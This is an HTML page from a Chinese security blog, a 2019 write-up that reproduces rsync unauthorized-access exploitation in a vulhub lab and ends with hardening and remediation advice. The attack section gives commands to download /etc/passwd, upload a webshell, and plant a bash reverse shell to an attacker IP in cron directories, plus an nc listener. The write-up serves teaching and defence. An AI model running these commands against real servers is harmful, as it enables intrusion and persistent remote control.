@@ -1,0 +1,185 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>rsync 未授权访问漏洞复现 | fanson&#39;s Blog</title>
+
+  
+  <meta name="author" content="fanson">
+  
+
+  
+  <meta name="description" content="你也一定是某个人翘首以盼的惊喜！
+
+最近在渗透环境中有遇到Rsync端口开放的，所以刚好也来复现下这个漏洞，亦当记录笔记：
+0x00 漏洞介绍
+Rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发">
+  
+
+  
+  
+  <meta name="keywords" content="渗透测试">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="rsync 未授权访问漏洞复现"/>
+
+  <meta property="og:site_name" content="fanson&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">fanson&#39;s Blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>rsync 未授权访问漏洞复现</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/04/20/rsync-未授权访问漏洞复现/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-20T08:55:25.000Z">
+          2019-04-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <blockquote>
+<p>你也一定是某个人翘首以盼的惊喜！</p>
+</blockquote>
+<p>最近在渗透环境中有遇到<code>Rsync</code>端口开放的，所以刚好也来复现下这个漏洞，亦当记录笔记：</p>
+<p><strong><em>0x00 漏洞介绍</em></strong></p>
+<p><code>Rsync</code>是<code>Linux</code>下一款数据备份工具，支持通过<code>rsync</code>协议、<code>ssh</code>协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。其中<code>rsync</code>协议默认监听<code>873</code>端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了<code>rsync</code>服务，并且没有配置<code>ACL</code>或访问密码，我们将可以读写目标服务器文件。</p>
+<p><strong><em>0x01 环境搭建</em></strong></p>
+<p>环境搭建我依然用<code>vulhub</code>，简直太好了！</p>
+<p>同样我们进入到<code>/vulhub-master/rsync/common</code>目录下，编译及运行<code>rsync</code>服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>但在编译的时候有报错</p>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/3.PNG" alt=""></p>
+<p>解决：在<code>Dockerfile</code>文件中<code>add</code> 这一行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN printf &quot;deb http://archive.debian.org/debian/ jessie main\ndeb-src http://archive.debian.org/debian/ jessie main\ndeb http://security.debian.org jessie/updates main\ndeb-src http://security.debian.org jessie/updates main&quot; &gt; /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/4.PNG" alt=""></p>
+<p>接着我们继续来看看<code>rsync</code>的常用命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">列举整个同步目录或指定目录：</span><br><span class="line">rsync ip::</span><br><span class="line">rsync ip::xxx/</span><br><span class="line">下载文件或目录到本地：</span><br><span class="line">rsync -avz ip::xxx/xx.php /root</span><br><span class="line">rsync -avz ip::xxx/ /var/tmp</span><br><span class="line">上传文件到服务器：</span><br><span class="line">rsync -avz webshell.php ip::web/</span><br></pre></td></tr></table></figure>
+<p><strong><em>0x02 漏洞复现</em></strong></p>
+<p><code>nmap</code>先扫一波：</p>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/6.PNG" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://your-ip:873/</span><br><span class="line">rsync rsync://your-ip:873/src 来查看模块名列表</span><br><span class="line">我们再列出src模块下的文件</span><br><span class="line">rsync rsync://your-ip:873/src/</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/1.PNG" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们可以下载任意文件：</span><br><span class="line">rsync -av rsync://your-ip:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/2.PNG" alt=""></p>
+<p><strong>提权：</strong></p>
+<p>写入<code>shell</code>并赋权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash </span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.128/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">chmod +x shell</span><br></pre></td></tr></table></figure>
+<p>将<code>shell</code>上传至<code>/etc/cron.hourly</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync://192.168.91.130/src/etc/cron.hourly</span><br><span class="line">rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/7.PNG" alt=""></p>
+<p>本地监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv -lp 4444</span><br></pre></td></tr></table></figure>
+<p><strong><em>0x03 防范与总结</em></strong></p>
+<p>这种未授权访问漏洞，一般都是在配置的时候，未能实现安全配置或权限认证而导致的，所以我们先来看看<code>rsync</code>的文件配置与认证方式。<code>rsync</code>的默认配置文件为<code>/etc/rsyncd.conf</code>，常驻模式启动命令的<code>rsync -daemon</code>，启动成功后默认监听于TCP端口873，可通过<code>rsync</code>的守护及SSH两种方式进行认证。</p>
+<p>我们来看下含有漏洞的<code>rsync</code>的文件的配置</p>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/5.PNG" alt=""></p>
+<p><code>rsync</code><strong>默认</strong>允许匿名访问，也可在其配置文件中为同步目录添加用户认证相关项，包括认证文件及授权账号，若未包含授权账号行（<code>auth users</code>），则为匿名访问。所以问题就出在这。</p>
+<p>我们来看下配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">配置文件位置：/etc/rsync.conf，常见配置项</span><br><span class="line"></span><br><span class="line">motd file -&gt; motd文件位置</span><br><span class="line">log file -&gt; 日志文件位置</span><br><span class="line">path -&gt; 默认路径位置</span><br><span class="line">use chroot -&gt; 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录</span><br><span class="line">read only -&gt; 只读配置（yes or no）</span><br><span class="line">list=true -&gt; 是否可以列出模块名</span><br><span class="line">uid = root -&gt; 传输使用的用户名</span><br><span class="line">gid = root -&gt; 传输使用的用户组</span><br><span class="line">auth users -&gt; 认证用户名</span><br><span class="line">secrets file=/etc/rsyncd.passwd -&gt; 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password</span><br><span class="line">hosts allow=192.168.0.101  -&gt; 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开</span><br><span class="line">hosts deny 禁止的主机，host的两项可以使用*表任意。</span><br></pre></td></tr></table></figure>
+<p>漏洞修复：</p>
+<ul>
+<li>正确配置认证用户名或者密码</li>
+<li>使用足够但最小权限</li>
+<li><code>host allow/deny</code> 来控制接入源IP</li>
+<li>可以配置只读</li>
+<li>非必要应该仅限制配置路径下可访问</li>
+</ul>
+<p><strong><em>0x04 参考</em></strong></p>
+<p>【1】<a href="https://github.com/vulhub/vulhub/tree/master/rsync/common" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/rsync/common</a></p>
+<p>【2】<a href="https://superuser.com/questions/1423486/issue-with-fetching-http-deb-debian-org-debian-dists-jessie-updates-inrelease/1424377%EF%BC%89" target="_blank" rel="noopener">https://superuser.com/questions/1423486/issue-with-fetching-http-deb-debian-org-debian-dists-jessie-updates-inrelease/1424377%EF%BC%89</a></p>
+<p>【3】<a href="https://blog.csdn.net/qq_36374896/article/details/84143428" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84143428</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/渗透测试/">渗透测试</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 fanson
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
